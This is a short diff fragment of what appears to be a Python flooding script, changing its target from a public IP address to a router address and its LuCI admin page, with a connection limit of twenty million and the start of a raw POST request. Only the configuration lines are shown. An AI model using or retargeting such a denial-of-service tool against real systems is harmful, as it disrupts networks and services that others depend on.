@@ -5,8 +5,8 @@ import threading
 #---------------------------
 MAX_CONN=20000000
 PORT=80
-HOST="119.28.140.189"
-PAGE="/"
+HOST="192.168.1.1"
+PAGE="/cgi-bin/luci"
 #---------------------------
  
 buf=("POST %s HTTP/1.1\r\n"
